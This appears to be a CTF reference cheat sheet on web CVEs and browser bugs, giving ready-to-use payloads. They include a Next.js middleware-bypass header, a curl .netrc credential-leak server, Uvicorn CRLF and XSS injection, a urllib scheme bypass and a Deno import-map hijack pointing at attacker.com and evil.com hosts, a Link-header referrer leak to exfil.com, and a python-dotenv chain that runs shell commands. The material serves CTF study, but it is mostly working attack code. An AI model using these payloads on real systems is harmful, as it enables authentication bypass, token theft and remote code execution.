# CTF Web - CVEs & Browser Vulnerabilities

Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM), see [node-and-prototype.md](node-and-prototype.md). For JWT algorithm confusion, see [auth-and-access.md](auth-and-access.md).

---

## CVE-2025-29927: Next.js Middleware Bypass

**Affected:** Next.js < 14.2.25

```http
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Bypasses authentication middleware, accesses protected endpoints, admin-only routes.

---

## CVE-2025-0167: Curl .netrc Credential Leakage

Server A (in `.netrc`) redirects to server B → curl sends credentials to B if B responds with `401 + WWW-Authenticate: Basic`

```python
@app.route('/<path:path>')
def leak(path):
    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
```

---

## Uvicorn CRLF Injection (Unpatched N-Day)

**Affected:** Uvicorn (FastAPI default ASGI server) — reported but ignored.

Uvicorn doesn't sanitize CRLF in response headers. Enables:
1. **CSP bypass** — inject headers that break Content-Security-Policy
2. **Cache poisoning** — break header/body boundary, Nginx caches attacker content
3. **XSS** — `\r\n\r\n` terminates headers, rest becomes response body

```python
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

**Detection:** FastAPI/Uvicorn backend + endpoint reflecting user input in response headers.

---

## Python urllib Scheme Validation Bypass (0-Day)

**Affected:** Python `urllib` — `urlsplit` vs `urlretrieve` inconsistency.

`urlsplit("<URL:http://attacker.com/evil>").scheme` returns `""` (empty), but `urlretrieve` still fetches it as HTTP.

```python
# App blocks http/https via urlsplit:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# Bypass: <URL:http://attacker.com/malicious.so>
# Also: %0ahttp://attacker.com/malicious.so (newline prefix)
```

Legacy `<URL:...>` format from RFC 1738.

---

## Chrome Referrer Leak via Link Header (2025)

```http
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome fetches linked resource with full referrer URL → leaks tokens from `/auth/callback?token=secret`.

---

## TCP Packet Splitting (Firewall Bypass)

Split blocked keywords across TCP packet boundaries:
```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
```

---

## Puppeteer/Chrome JavaScript Bypass

`page.setJavaScriptEnabled(false)` only affects current context. `window.open()` from iframe → new window has JS enabled.

---

## Python python-dotenv Injection

Escape sequences and newlines in values:
```
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```
Chain with `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER=/bin/sh -c "cat /flag" %s` for RCE.
See ctf-misc/pyjails.md for PYTHONWARNINGS technique details.

---

## HTTP Request Splitting via RFC 2047

CherryPy decodes RFC 2047 headers → CRLF injection:
```python
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

---

## Waitress WSGI Cookie Exfiltration

Invalid HTTP method echoed in error response. CRLF splits request, cookie value lands at method position, error echoes it.

---

## Deno Import Map Hijacking

Deno v1.18+ auto-discovers `deno.json`. Via prototype pollution:
```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

---

## CVE-2025-8110: Gogs Symlink RCE

See [server-side.md](server-side.md) for full details.

---

## Detection Checklist

1. **Framework versions** in `package.json`, `requirements.txt`, `Dockerfile`
2. **ASGI/WSGI server** (Uvicorn, Waitress) for CRLF/header issues
3. **curl usage** with `.netrc` or redirect handling
4. **Firewall/WAF** inspection patterns (TCP packet splitting)
5. **dotenv** or environment variable handling
6. **urllib** scheme validation (check for `<URL:...>` bypass)
7. **Node.js libraries** — see [node-and-prototype.md](node-and-prototype.md) for full list
